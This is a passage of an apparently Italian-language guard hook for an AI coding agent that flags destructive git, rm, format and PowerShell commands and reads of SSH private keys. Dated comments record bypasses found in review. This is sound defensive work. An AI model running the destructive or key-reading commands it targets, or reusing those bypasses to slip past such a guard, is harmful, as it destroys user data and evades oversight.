            if sotto == "branch":
                forza, rami = _branch_cancella(resto)
                if forza:
                    cancellati.update(rami)
    salvati = set()
    for nome, args, cds in programmi:
        if nome != "git":
            continue
        cartella, sotto, resto = _git_parti(args)
        if sotto == "tag":
            nomi = [a for a in _senza_redirezioni(resto) if not a.startswith("-")]
            elenca = any(a in ("-l", "--list", "-d", "--delete", "-v", "--verify") for a in resto)
            if not elenca and len(nomi) >= 2 and re.fullmatch(r"stash@\{\d+\}", nomi[1]):
                salvati.add(_stash_ref(nomi[1:2]))
            continue
        if sotto == "stash" and resto[:1] == ["show"]:
            patch = any(a in ("-p", "--patch") or (re.match(r"^-[A-Za-z]+$", a) and "p" in a) for a in resto[1:])
            destinazioni = []
            for i, a in enumerate(resto):
                m = re.match(r"^1?>>?(.*)$", a)
                if m:
                    destinazioni.append(m.group(1) or (resto[i + 1] if i + 1 < len(resto) else ""))
            if patch and any(x and x != "/dev/null" for x in destinazioni):
                salvati.add(_stash_ref(_senza_redirezioni(resto[1:])))
            continue
        if sotto == "stash" and resto[:1] == ["clear"]:
            return ("git-stash", "git stash clear cancella tutti gli stash: le modifiche dentro non stanno in "
                    "nessun commit. Salvali prima con `git stash show -p stash@{N} > file.patch`, oppure conferma.")
        if sotto == "stash" and resto[:1] == ["drop"]:
            ref = _stash_ref(_senza_redirezioni(resto[1:]))
            if ref not in salvati:
                return ("git-stash", "git stash drop cancella uno stash che lo stesso comando non salva prima: "
                        "le modifiche dentro non stanno in nessun commit. Salvalo prima con "
                        "`git stash show -p stash@{N} > file.patch` (lo stesso stash del drop), oppure conferma.")
            # Dopo il drop gli stash sotto salgono di un posto: stash@{1} diventa stash@{0} (review del 1/11).
            salvati.discard(ref)
            if isinstance(ref, int):
                salvati = {k - 1 if isinstance(k, int) and k > ref else k for k in salvati}
            continue
        if sotto == "worktree" and resto[:1] == ["remove"]:
            perso = _worktree_perde(cartella, resto[1:], cds, cwd)
            if perso:
                return perso
            continue
        if sotto != "branch":
            continue
        forza, rami = _branch_cancella(resto)
        if not forza:
            continue
        basi = _basi_dopo_cd(cds, cwd)
        if len(basi) != 1 or basi[0] is None:
            repo = None
        else:
            repo = _resolve(cartella, basi[0]) if cartella else basi[0]
        for ramo in rami:
            if repo is None or not _ramo_altrove(repo, ramo, cancellati):
                return ("git-ramo", f"git branch -D cancella il ramo {ramo}, e i suoi commit non stanno in un ramo "
                        "remoto né in un altro ramo locale che resta: si perderebbero. Conferma solo se non ti servono.")
    return None


# --- git commit --amend sul commit di un'altra sessione (3/11/2026, #4187, segnalazione n. 25) ---
# Due sessioni sullo stesso repository: fra il commit di A e il suo `--amend` per un refuso, B aveva fatto
# un commit, e l'amend ha riscritto quello di B. Il modo `dopo` (PostToolUse di Bash) registra per
# sessione l'HEAD lasciato da ogni `git commit`; prima di un amend, un HEAD che la sessione non ha
# registrato chiede conferma. Nel dubbio (sessione senza id, repository illeggibile) chiede.
_SESSIONE_RE = re.compile(r"^[A-Za-z0-9_-]{1,80}$")
_REGISTRO_MAX = 50


def _registro_percorso(sessione):
    if not isinstance(sessione, str) or not _SESSIONE_RE.match(sessione):
        return None
    return os.path.join(_home(), ".claude", "session-env", f"commit-{sessione}.json")


def _registro_leggi(percorso):
    try:
        with open(percorso, encoding="utf-8") as f:
            dati = json.load(f)
    except (OSError, ValueError):
        return {}
    return dati if isinstance(dati, dict) else {}


def _commit_del_comando(command, cwd):
    """[(repository o None, amend)] per ogni `git … commit` del comando, nell'ordine. None se la
    cartella non è una sola o se --git-dir/--work-tree la spostano."""
    out = []
    for nome, args, cds in _programmi_con_cd(command):
        if nome != "git":
            continue
        cartella, sotto, resto = _git_parti(args)
        if sotto != "commit":
            continue
        amend = _lunga([a for a in resto if a.startswith("--")], "--amend")
        basi = _basi_dopo_cd(cds, cwd)
        if any(a.split("=", 1)[0] in ("--git-dir", "--work-tree") for a in args):
            repo = None
        elif len(basi) != 1 or basi[0] is None:
            repo = None
        else:
            repo = _resolve(cartella, basi[0]) if cartella else basi[0]
        out.append((repo, amend))
    return out


def _testa(repo):
    """(radice del repository, sha di HEAD) oppure None."""
    uscita = _git_esegui(repo, "rev-parse", "--show-toplevel", "HEAD")
    righe = uscita.splitlines() if uscita else []
    if len(righe) != 2:
        return None
    return os.path.normcase(os.path.normpath(righe[0])), righe[1].strip()


def registra_commit(data) -> int:
    """Modo `dopo`: scrive nel registro della sessione l'HEAD dei repository dove il comando ha fatto un commit."""
    percorso = _registro_percorso(data.get("session_id"))
    command = (data.get("tool_input") or {}).get("command", "")
    if not percorso or not isinstance(command, str) or "commit" not in command:
        return 0
    registro = None
    for repo, _amend in _commit_del_comando(command, data.get("cwd") or _home()):
        testa = _testa(repo) if repo else None
        if not testa:
            continue
        if registro is None:
            registro = _registro_leggi(percorso)
        voci = [s for s in registro.get(testa[0], []) if isinstance(s, str) and s != testa[1]]
        registro[testa[0]] = (voci + [testa[1]])[-_REGISTRO_MAX:]
    if registro is not None:
        os.makedirs(os.path.dirname(percorso), exist_ok=True)
        provvisorio = f"{percorso}.{os.getpid()}"
        with open(provvisorio, "w", encoding="utf-8") as f:
            json.dump(registro, f)
        os.replace(provvisorio, percorso)
    return 0


def _amend_altrui(command, cwd, sessione):
    """Il motivo della conferma se un `git commit --amend` del comando riscrive un HEAD che questa sessione
    non ha registrato, None se no. Un commit senza amend prima, nello stesso comando e repository, è suo."""
    commit = _commit_del_comando(command, cwd)
    if not any(amend for _r, amend in commit):
        return None
    percorso = _registro_percorso(sessione)
    registro = _registro_leggi(percorso) if percorso else {}
    fatti = set()
    for repo, amend in commit:
        if not amend:
            if repo:
                fatti.add(repo)
            continue
        if repo in fatti:
            continue
        testa = _testa(repo) if repo else None
        if not testa:
            return ("git commit --amend su un repository che la guardia non riesce a leggere: se un'altra "
                    "sessione ha fatto un commit nel frattempo, l'amend riscrive il suo. Controlla con "
                    "`git log -1` prima di confermare.")
        if testa[1] not in registro.get(testa[0], []):
            ultimo = (_git_esegui(repo, "log", "-1", "--format=%h %s") or testa[1][:7]).strip()[:90]
            return (f"L'ultimo commit ({ultimo}) non l'ha fatto questa sessione: se un'altra sessione ha fatto "
                    "un commit nel frattempo, l'amend riscrive il suo. Per un refuso nel messaggio lascialo "
                    "stare. Conferma solo se il commit è tuo.")
    return None


# shutil.rmtree cancella una cartella intera come `rm -r`, ma da dentro python (17/10/2026, #3506).
_RMTREE_RE = re.compile(r"\b(?:shutil\.)?rmtree\s*\(\s*(?:(['\"])([^'\"]*)\1|([A-Za-z_]\w*)\s*\))?")
# `py` è il lanciatore di python su Windows (20/10/2026, #3525: `py -c "...rmtree..."` passava).
_PYTHON_RE = re.compile(r"(?:^|[\s;&|(/])(?:python3?(?:\.\d+)?|py)(?=\s|$)", _RE_NOMI)
_RMTREE_ALIAS_RE = re.compile(r"\brmtree\s+as\s+([A-Za-z_]\w*)")
_TEMPORANEA = "<cartella di tempfile>"


def _rmtree_bersagli(command):
    """I bersagli di shutil.rmtree nel codice python del comando: il percorso scritto, o None se il
    percorso arriva da una variabile. Il corpo di un heredoc che va a un lettore (cat, tee) non conta."""
    testo = _hd.togli(command, lambda h: h.quotato and h.inerte())
    if "rmtree" not in testo or "shutil" not in testo or not _PYTHON_RE.search(testo):
        return []
    # `from shutil import rmtree as r` e poi `r(...)`: l'alias cancella come rmtree (20/10/2026, #3525).
    for alias in _RMTREE_ALIAS_RE.findall(testo):
        testo += "\n" + re.sub(r"\b" + re.escape(alias) + r"\s*\(", "rmtree(", testo)
    bersagli = []
    for m in _RMTREE_RE.finditer(testo):
        if m.group(1):
            bersagli.append(m.group(2))
        elif m.group(3) and re.search(r"\b" + re.escape(m.group(3)) + r"\s*=\s*tempfile\.mkdtemp\s*\(", testo):
            bersagli.append(_TEMPORANEA)  # una cartella appena creata da tempfile: è temporanea
        else:
            bersagli.append(None)
    return bersagli


# Le opzioni di git prima del sottocomando che prendono un valore staccato.
_GIT_OPZIONI_CON_VALORE = frozenset(("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path",
                                     "--config-env", "--super-prefix"))


def _git_clean_forzato(command):
    """`git clean` con -f o --force e senza -n/--dry-run, anche con opzioni di git in mezzo
    (`git -C dir clean -fdx`). Cancella i file non tracciati: git non li sa ridare."""
    for nome, args in _forma().programmi(command):
        if nome != "git":
            continue
        i, senza_obbligo = 0, False
        while i < len(args) and args[i].startswith("-"):
            # `git -c clean.requireForce=false clean` cancella anche senza -f (20/10/2026, #3525).
            if args[i] == "-c" and i + 1 < len(args) and \
                    args[i + 1].replace(" ", "").lower() in ("clean.requireforce=false", "clean.requireforce=0",
                                                             "clean.requireforce=no", "clean.requireforce=off"):
                senza_obbligo = True
            i += 2 if args[i] in _GIT_OPZIONI_CON_VALORE else 1
        if i >= len(args) or args[i] != "clean":
            continue
        corte, lunghe = "", []
        resto = args[i + 1:]
        k = 0
        while k < len(resto):
            a = resto[k]
            if a == "--":
                break
            if a.startswith("--"):
                lunghe.append(a.split("=", 1)[0])
                if a in ("--exclude",):
                    k += 1  # il valore staccato di --exclude non è un'opzione
            elif a.startswith("-"):
                # -e prende un valore attaccato o staccato: `-enode_modules` non contiene un -n.
                gruppo = a[1:]
                if "e" in gruppo:
                    corte += gruppo[:gruppo.index("e")]
                    if gruppo.endswith("e"):
                        k += 1
                else:
                    corte += gruppo
            k += 1
        # git accetta l'inizio di un'opzione lunga se non è ambiguo: `--forc` è `--force`.
        forza = "f" in corte or any(len(o) > 2 and "--force".startswith(o) for o in lunghe) or senza_obbligo
        prova = "n" in corte or any(len(o) > 2 and "--dry-run".startswith(o) for o in lunghe)
        if forza and not prova:
            return True
    return False


_REDIREZIONE_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)")
_REDIREZIONE_SOLA_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)$")


_CAMBIA_CARTELLA = frozenset(("cd", "pushd", "popd"))
_CD_RIDEFINITO = re.compile(r"(?:^|[;&|\s(])(?:function\s+)?(?:cd|pushd|popd)\s*\(\s*\)"
                            r"|\bfunction\s+(?:cd|pushd|popd)\b|\balias\s+(?:cd|pushd|popd)=")
_APRE_BLOCCO = frozenset("if while until for case select".split())
_CHIUDE_BLOCCO = frozenset("fi done esac".split())
_OPERATORI = re.compile(r"&&|\|\||;;|\|&|[;&|()\n]")


def _cd_certi(command, profondita=0, forzato=False):
    """Per ogni cd, pushd e popd del comando, nell'ordine di forma_comando.programmi: True se gira di
    sicuro nella shell dei comandi che lo seguono (31/10/2026).

    Non è sicuro un cd in ( ), in $( ) o <( ), fra backtick, in un blocco { } o nel corpo di una
    funzione, in un ramo di if/while/until/for/case/select, dentro sh -c o eval, dopo `||` o `|`,
    dopo `&&` preceduto da un altro comando, o seguito da `&`, `|` o `||`. Le parole si leggono come
    in forma_comando: stesso testo (testo_shell) e stessi confini."""
    forma = _forma()
    try:
        gettoni = list(forma.lexer(forma.testo_shell(command)))  # senza commenti, come programmi (finding 0)
    except ValueError:
        return []  # forma_comando ricade su uno split semplice: il conteggio non torna, e ogni cd è incerto
    out = []
    pila = []          # "sub", "subst", "kw", "graffa"
    backtick = False
    parole = []        # il comando semplice in corso
    prima = None       # l'operatore prima del comando
    indice = 0         # posizione del comando nella lista && / ||
    precedente = None  # l'ultimo gettone visto

    def chiudi(dopo):
        nonlocal parole, prima, indice
        if parole:
            i = 0
            while i < len(parole) and (parole[i] in forma._DAVANTI or forma._ASSEGNAZIONE.match(parole[i])
                                       or forma._nome(parole[i]) in forma._WRAPPER):
                i += 1
            nome = forma._nome(parole[i]) if i < len(parole) else ""
            args = parole[i + 1:]
            if nome in _CAMBIA_CARTELLA:
                out.append(not (forzato or pila or backtick) and prima in (None, ";", "\n", "&", ";;")
                           and indice == 0 and dopo not in ("|", "|&", "&", "||"))
            if profondita < 3:
                codice = forma.codice_shell(args) if nome in forma.SHELL else None
                if codice is not None:
                    out.extend(_cd_certi(codice, profondita + 1, True))
                elif nome == "eval" and args:
                    out.extend(_cd_certi(" ".join(args), profondita + 1, True))
        parole = []
        if dopo in ("&&", "||"):
            indice += 1
        elif dopo is not None:
            indice = 0
        prima = dopo

    for g in gettoni:
        if g and set(g) <= set(";&|()\n"):
            for op in _OPERATORI.findall(g):
                if op == "(":
                    if parole and parole[-1].endswith(("$", "<", ">")):
                        chiudi(None)
                        pila.append("subst")
                    elif parole and precedente not in (None, "(") and not set(precedente) <= set(";&|()\n"):
                        pila.append("funz")  # `f() {`: le parentesi della definizione
                    else:
                        chiudi(None)
                        pila.append("sub")
                elif op == ")":
                    if pila and pila[-1] == "funz":
                        pila.pop()
                        chiudi(None)
                        pila.append("graffa-funz")
                    elif pila and pila[-1] in ("sub", "subst"):
                        chiudi(None)
                        pila.pop()
                    else:
                        chiudi(None)  # il pattern di un case
                else:
                    chiudi(op)
                precedente = op
            continue
        if g.count("`") % 2:
            backtick = not backtick
        if all(p in forma._DAVANTI for p in parole):  # posizione di comando, anche dopo then, do, {
            if g in _APRE_BLOCCO:
                pila.append("kw")
            elif g in _CHIUDE_BLOCCO and "kw" in pila:
                del pila[len(pila) - 1 - pila[::-1].index("kw")]
            elif g == "{":
                if pila and pila[-1] == "graffa-funz":
                    pila[-1] = "graffa"
                else:
                    pila.append("graffa")
            elif g == "}" and "graffa" in pila:
                del pila[len(pila) - 1 - pila[::-1].index("graffa")]
        parole.append(g)
        precedente = g
    chiudi(None)
    return out


def _programmi_con_cd(command):
    """(programma, argomenti, catena dei cd prima di lui) per ogni comando che non è cd, pushd o popd.

    Ogni voce della catena è (cartella o None, certo): None per popd, `cd -`, `cd -P x`, `pushd +1`;
    certo viene da _cd_certi. Se le due letture non contano gli stessi cd, ogni cd vale come incerto."""
    out = []
    cds = []
    programmi = _forma().programmi(command)
    certi = _cd_certi(command)
    if len(certi) != sum(1 for nome, _ in programmi if nome in _CAMBIA_CARTELLA):
        certi = None
    # Un CR senza LF dopo separa le parole per il lexer ma non per bash e zsh (`cd /tmp\r` cerca la
    # cartella "/tmp\r"), e un cd ridefinito come funzione o alias non cambia cartella: ogni cd è
    # incerto (1/11/2026, F14 F15).
    if re.search(r"\r(?!\n)", command) or _CD_RIDEFINITO.search(command):
        certi = None
    for nome, args in programmi:
        if nome in _CAMBIA_CARTELLA:
            certo = bool(certi and certi[len(cds)])
            if nome == "popd" or (args and (args[0].startswith(("-", "+")) and args[0] != "--")):
                dest = None
            else:
                resto = args[1:] if args and args[0] == "--" else args
                dest = resto[0] if resto else ("~" if nome == "cd" else None)  # `cd` da solo va nella home
                if len(_senza_redirezioni(resto)) > 1:
                    certo = False  # `cd /tmp foo`: "too many arguments", resta dov'era (F15)
            cds.append((dest, certo))
            continue
        out.append((nome, args, tuple(cds)))
    return out


def _reale(p):
    """Il percorso con i link risolti nella parte che esiste già (1/11/2026, F18): `/tmp/xx/*` con
    /tmp/xx link ai progetti è la cartella dei progetti. Un glob resta in coda, come scritto."""
    if p is None:
        return None
    testa, coda = p, []
    while testa and not os.path.lexists(testa):
        su, nome = os.path.split(testa)
        if su == testa:
            return p
        coda.insert(0, nome)
        testa = su
    try:
        vero = os.path.realpath(testa)
        # Nessun link sul percorso: resta com'è scritto. Su Windows realpath trasforma anche `/tmp` in
        # `C:\tmp`, che non è il temporaneo che la shell intende.
        if os.path.normcase(vero) == os.path.normcase(os.path.normpath(os.path.abspath(testa))):
            return p
        reale = os.path.normpath(os.path.join(vero, *coda))
        # Su macOS realpath porta /var e /tmp sotto /private: la home e i progetti tornano nella forma con
        # cui li conoscono le regole (RV02 rosso su macOS il 1/11/2026, verde su Windows senza link).
        casa = os.path.normpath(_home())
        casa_vera = os.path.realpath(casa)
        if casa_vera != casa and (reale == casa_vera or reale.startswith(casa_vera + os.sep)):
            reale = casa + reale[len(casa_vera):]
        return reale
    except (OSError, ValueError):
        return p


def _sotto_link_nuovo(p, command, cwd):
    """Vero se `p` sta sotto un link che lo stesso comando crea con `ln -s`: il link non esiste ancora
    quando la guardia gira, e realpath non lo vede."""
    for nome, args in _forma().programmi(command):
        if nome != "ln":
            continue
        if not any(a == "--symbolic" or (a.startswith("-") and not a.startswith("--") and "s" in a) for a in args):
            continue
        posizionali = [a for a in _senza_redirezioni(args) if not a.startswith("-")]
        if len(posizionali) < 2:
            continue
        link = _resolve(posizionali[-1], os.path.normpath(cwd))
        if link and (p == link or p.startswith(link.rstrip("/\\") + os.sep) or p.startswith(link.rstrip("/") + "/")):
            return True
    return False


# La radice, la home intera e il disco intero (1/11/2026, F33 F35 e review delle correzioni): si giudicano
# sui programmi del comando, non sul testo, così `grep -n "rm -rf /" f` e "Format A:" in una stringa tacciono.
_RADICE_RM = re.compile(r"^(?:/|~/?|\$HOME/?|\$\{HOME\}/?)\*?$")
_DISCO_DEL = re.compile(r"^[a-zA-Z]:[\\/]*(?:\*(?:\.\*)?)?$")
_DISCO_RD = re.compile(r"^[a-zA-Z]:[\\/]*$")


def _distruzione_totale(command, profondita=0):
    """Il motivo del blocco se il comando cancella la radice, la home o un disco intero; None altrimenti."""
    for nome, args in _forma().programmi(command):
        nome = nome.lower()
        if nome.endswith(".exe"):
            nome = nome[:-4]
        opzioni = [a.lower() for a in args if a.startswith("/") and len(a) == 2]
        if nome == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k") and profondita < 3:
            motivo = _distruzione_totale(" ".join(a.replace("\\", "\\\\") for a in args[1:]), profondita + 1)
            if motivo:
                return motivo
            continue
        if nome == "rm" and _forma()._ricorsivo(args) and any(_RADICE_RM.match(a) for a in args if not a.startswith("-")):
            return "rm ricorsivo sulla radice o sulla home intera"
        if nome in ("del", "erase") and "/s" in opzioni and any(_DISCO_DEL.match(a) for a in args):
            return "cancellazione ricorsiva del disco intero"
        if nome in ("rd", "rmdir") and "/s" in opzioni and any(_DISCO_RD.match(a) for a in args):
            return "cancellazione ricorsiva del disco intero"
        if nome == "format" and any(re.fullmatch(r"[a-zA-Z]:", a) for a in args):
            return "format filesystem"
    return None


# Una destinazione del push riscritta nello stesso comando (review delle correzioni del 1/11/2026): git legge
# le chiavi senza badare alle maiuscole, `git -C dir -c …` e GIT_CONFIG_* sfuggivano ai deny di settings.json.
_CHIAVE_DESTINAZIONE = re.compile(r"^(?:remote\..+\.(?:url|pushurl)|url\..+\.(?:push)?insteadof)=", re.IGNORECASE)
_GIT_CONFIG_AMBIENTE = re.compile(r"\bGIT_CONFIG_(?:COUNT|KEY_\d+|PARAMETERS)=", re.IGNORECASE)


def _push_riscritto(command) -> bool:
    for nome, args in _forma().programmi(command):
        if nome != "git":
            continue
        i, riscritto = 0, False
        while i < len(args) and args[i].startswith("-"):
            a = args[i]
            if a == "-c" and i + 1 < len(args) and _CHIAVE_DESTINAZIONE.match(args[i + 1]):
                riscritto = True
            elif a.startswith("-c") and len(a) > 2 and _CHIAVE_DESTINAZIONE.match(a[2:]):
                riscritto = True
            elif a.startswith("--config-env"):
                riscritto = True
            i += 2 if a in _GIT_OPZIONI_CON_VALORE else 1
        if i < len(args) and args[i] == "push" and (riscritto or _GIT_CONFIG_AMBIENTE.search(command)):
            return True
    return False


# PowerShell (finding 8): Remove-Item e i suoi alias con -Recurse, scritto anche -r o -rec.
_PS_RIMUOVE = frozenset(("remove-item", "ri", "rm", "del", "erase", "rd", "rmdir"))
_PS_RICORSIVO = re.compile(r"^-r(?:e(?:c(?:u(?:r(?:s(?:e)?)?)?)?)?)?$", re.IGNORECASE)
_PS_COMANDO = re.compile(r"^[-/]c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$", re.IGNORECASE)
_PS_CODIFICATO = re.compile(r"^[-/]e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?|c)?$",
                            re.IGNORECASE)


def _codice_powershell(args):
    """Il codice che `powershell` o `pwsh` esegue: dopo -Command, decodificato da -EncodedCommand, o gli
    argomenti liberi. None con -File: lo script sta in un file."""
    for i, a in enumerate(args):
        if _PS_COMANDO.match(a):
            return " ".join(args[i + 1:])
        if _PS_CODIFICATO.match(a) and i + 1 < len(args):
            try:
                import base64
                return base64.b64decode(args[i + 1]).decode("utf-16-le")
            except Exception:
                return ""
        if a.lower() in ("-file", "/file", "-f"):
            return None
    return " ".join(a for a in args if not a.startswith("-"))


def _istruzioni_powershell(codice):
    """Le istruzioni del codice PowerShell, ognuna come lista dei suoi stadi in pipe. Spezza con le regole
    di PowerShell: `;`, `|`, `&&` e `||` fra virgolette restano testo (#5122)."""
    istruzioni, stadi, inizio = [], [], 0
    for a, b, tipo in _fc._separatori(codice, lingua="powershell"):
        stadi.append(codice[inizio:a])
        if tipo != "|":
            istruzioni.append(stadi)
            stadi = []
        inizio = b
    stadi.append(codice[inizio:])
    istruzioni.append(stadi)
    return istruzioni


def _powershell_rimuove(args):
    """I bersagli di ogni Remove-Item ricorsivo nel codice di `powershell -Command`: una lista per
    istruzione, None se arrivano da una pipe o non si leggono."""
    codice = _codice_powershell(args)
    if codice is None:
        return []
    out = []
    for stadi in _istruzioni_powershell(codice):
        for k, stadio in enumerate(stadi):
            parole = [p.strip("'\"") for p in re.findall(r"'[^']*'|\"[^\"]*\"|\S+", stadio)]
            if parole and parole[0].lower() in _PS_RIMUOVE and any(_PS_RICORSIVO.match(p) for p in parole[1:]):
                bersagli = [p for p in parole[1:] if not p.startswith("-")]
                out.append(bersagli if bersagli and k == 0 else None)
    return out


# cmd e powershell (review del 9/11/2026, #5096): il loro codice è un argomento, e le regole per programma
# non lo leggevano. `cmd //c type <chiave>` e `powershell Set-Content <config>` passavano senza conferma.
_WIN_SCRIVE = re.compile(
    r"(?:^|[\s;|&(])(?:set-content|add-content|out-file|tee-object|new-item|copy-item|move-item|remove-item|"
    r"rename-item|clear-content|sc|ac|ni|cpi|copy|cp|mi|move|mv|ri|del|erase|rm|rni|ren|rename|xcopy|robocopy|"
    r"mklink)(?=[\s(]|$)|>|\[(?:system\.)?io\.file\]::(?:write|append|copy|move|delete|create|replace)",
    re.IGNORECASE)
# I percorsi protetti per cmd e powershell: tutte le voci della tabella, maiuscole piegate.
_WIN_PROTETTI = tuple((regola, re.compile(_frammenti(regola, "win"), re.IGNORECASE))
                      for regola in _MAIUSCOLE)


def _codici_windows(testo):
    """Il codice di ogni `cmd /c` e `powershell -Command` del comando, con le barre dritte."""
    out = []
    for nome, args in _fc.programmi(testo):
        basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
        if basso == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k"):
            out.append(_barre(" ".join(args[1:]), sempre=True))
        elif basso in ("powershell", "pwsh"):
            codice = _codice_powershell(args)
            if codice:
                out.append(_barre(codice, sempre=True))
    return out


def _regole_windows(testo):
    """Le regole che il codice di cmd e powershell tocca: segreto se nomina un file segreto, e la regola del
    percorso (config, sblocco, claude-md, avvio-automatico) se scrive e nomina un percorso protetto."""
    regole = set()
    for codice in _codici_windows(testo):
        if SECRET_PATH_RE.search(codice) or _SECRET_DIR_RE.search(codice) or ENV_RE.search(codice):
            regole.add("segreto")
        if _WIN_SCRIVE.search(codice):
            for regola, pattern in _WIN_PROTETTI:
                if pattern.search(codice):
                    regole.add(regola)
    return regole


_PUSH_RISCRIVE = ("--force", "--force-with-lease", "--force-if-includes", "--mirror", "--delete", "--prune")


def _push_forzato(command):
    """Il motivo se un git push riscrive o cancella rami remoti, in qualunque posizione del flag
    (review del 7/11/2026, finding 5): i deny di settings.json vogliono il flag subito dopo push, e
    `git push origin main --force` passava. None se il push è normale."""
    for nome, args in _fc.programmi(command):
        if nome != "git":
            continue
        _, sotto, resto = _git_parti(args)
        if sotto != "push":
            continue
        liberi, salta = [], False
        for a in resto:
            if salta:
                salta = False
                continue
            if a in ("-o", "--push-option", "--repo", "--receive-pack", "--exec"):
                salta = True
                continue
            if a.startswith("--"):
                lunga = a.split("=", 1)[0]
                if len(lunga) >= 4 and any(o.startswith(lunga) for o in _PUSH_RISCRIVE):
                    return f"git push con {a}: riscrive o cancella rami sul remoto"
                continue
            if a.startswith("-") and len(a) > 1:
                if "f" in a[1:] or "d" in a[1:]:
                    return f"git push con {a}: riscrive o cancella rami sul remoto"
                continue
            liberi.append(a)
        for refspec in liberi[1:]:
            if refspec.startswith("+") or (refspec.startswith(":") and len(refspec) > 1):
                return f"git push con il refspec {refspec}: riscrive o cancella un ramo sul remoto"
    return None


def _rm_segments(command):
    """(bersagli, catena dei cd) per ogni `rm` ricorsivo; bersagli None per `xargs rm -r`.

    I comandi si leggono con forma_comando.programmi: `rm` col path completo, in
    una subshell o in un blocco `{ }`, dopo `then`/`do`, dietro un wrapper o dentro
    `sh -c` ed `eval` è lo stesso `rm`. Il testo di un heredoc quotato verso python
    o cat non è un comando. `xargs rm -r` ha bersagli che arrivano da stdin.
    Dal 31/10/2026 si tengono tutti i cd prima dell'rm, in ordine: `cd "$S/x" && …; cd .. &&
    rm -rf x` cancella in $S, e la guardia teneva solo l'ultimo cd (`..`) e lo leggeva dalla
    cwd della sessione. Li risolve _basi_dopo_cd.
    """
    forma = _forma()
    out = []
    for nome, args, cwd_decl in _programmi_con_cd(command):
        # Windows (review del 7/11/2026, finding 8): rd, rmdir, del ed erase con /s, e dentro cmd /c.
        basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
        if basso == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k"):
            interni = _rm_segments(" ".join(a.replace("\\", "\\\\") for a in args[1:]))
            out += [(t, cwd_decl + c) for t, c in interni]
            continue
        if basso in ("rd", "rmdir", "del", "erase") and any(a.lower() in ("/s", "//s") for a in args):
            out.append(([a for a in args if not (a.startswith("/") and len(a) <= 3)], cwd_decl))
            continue
        if basso in ("powershell", "pwsh"):
            for bersagli in _powershell_rimuove(args):
                out.append((bersagli, cwd_decl))
            continue
        if nome.startswith("$") and re.search(r"(?:^|[\s'\"=;&|(])(?:rm|unlink|shred)(?:[\s'\";&|)]|$)", command, _RE_NOMI):
            out.append((None, cwd_decl))  # `RM='rm -rf'; $RM x`: il programma è una variabile (finding 2)
            continue
        if nome == "xargs" and "rm" in [forma._nome(a) for a in args]:
            dopo = args[[forma._nome(a) for a in args].index("rm") + 1:]
            if forma._ricorsivo(dopo):
                out.append((None, cwd_decl))
            continue
        if nome == "rm":
            recursive = False
            targets = []
            salta = False
            for tk in args:
                # Una redirezione non è un bersaglio: `rm -rf build 2>/dev/null` non cancella
                # /dev/null (19/10/2026). `>` da solo porta con sé la parola che segue.
                if salta:
                    salta = False
                    continue
                if _REDIREZIONE_RE.match(tk):
                    salta = _REDIREZIONE_SOLA_RE.match(tk) is not None
                    continue
                if tk == "--recursive":
                    recursive = True
                elif tk.startswith("-") and tk != "--":
                    if "r" in tk.lower():
                        recursive = True
                elif tk != "--":
                    targets.append(tk)
            if recursive:
                out.append((targets, cwd_decl))
    return out


def _basi_dopo_cd(cds, cwd):
    """Le cartelle da cui può girare un comando dopo la catena `cds` (31/10/2026).

    Ogni cd parte da dove ha lasciato il precedente, con le variabili assegnate nel comando
    (`S=…; cd "$S/x"`). Se la cartella di un cd non esiste adesso, il cd può fallire e un
    comando dopo `;` gira dalla cartella di prima: contano entrambe, e l'rm passa solo se è
    sicuro da tutte. None = una cartella che non si risolve (`cd -`, `cd $(…)`, popd).
    Un cd che non gira di sicuro nella shell dell'rm (in una subshell, in un ramo, dopo `||`, dopo
    `&&` preceduto da un altro comando, prima di `&` o `|`: vedi _cd_certi) tiene anche la cartella
    di prima, anche quando la sua cartella esiste."""
    basi = [os.path.normpath(cwd)]
    for c, certo in cds:
        nuove = []
        for b in basi:
            dest = None if (b is None or c is None) else _resolve(c, b)
            for x in ([dest] if certo and dest is not None and os.path.isdir(dest) else [dest, b]):
                if x not in nuove:
                    nuove.append(x)
        basi = nuove
        if len(basi) > 16:
            return [None]
    return basi


def _inert_reference(command: str) -> bool:
    if re.search(r"[;&|]|\$\(|`|<\(|>\(", command):
        return False
    return bool(re.match(r"\s*(?:echo|printf|cat)\b", command))


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0

    # Modo `dopo` (PostToolUse di Bash): registra i commit della sessione per la regola git-amend. Non
    # decide niente e non scrive su stdout; un suo errore non ferma la sessione.
    if sys.argv[1:2] == ["dopo"]:
        try:
            if data.get("tool_name") == "Bash":
                registra_commit(data)
        except Exception:
            pass
        return 0

    # Read di una chiave privata in ~/.ssh con un nome libero (`~/.ssh/github`): i deny di settings.json
    # coprono solo i nomi noti, e `Read` in allow salta il classificatore (1/11/2026, F01).
    if data.get("tool_name") == "Read":
        percorso = str((data.get("tool_input") or {}).get("file_path") or "")
        if _SSH_LETTURA.search(re.sub(r"/+", "/", percorso.replace("\\", "/"))):
            return _ask("segreto",
                "Lettura di un file in ~/.ssh che non è config, known_hosts, authorized_keys o una chiave "
                "pubblica: è probabilmente una chiave privata, e il contenuto finirebbe nel contesto. "
                "Conferma solo se serve davvero.")
        return 0
    # Grep stampa le righe dei file che legge: su una chiave di ~/.ssh o sulla cartella intera vale come
    # Read (review del 7/11/2026, finding 4). settings.json gli manda anche il tool Grep.
    if data.get("tool_name") == "Grep":
        percorso = re.sub(r"/+", "/", str((data.get("tool_input") or {}).get("path") or "").replace("\\", "/"))
        if _SSH_LETTURA.search(percorso) or re.search(r"(?:^|/)\.ssh/?$", percorso):
            return _ask("segreto",
                "Ricerca con Grep dentro ~/.ssh: le righe trovate delle chiavi private finirebbero nel "
                "contesto. Conferma solo se serve davvero.")
        return 0
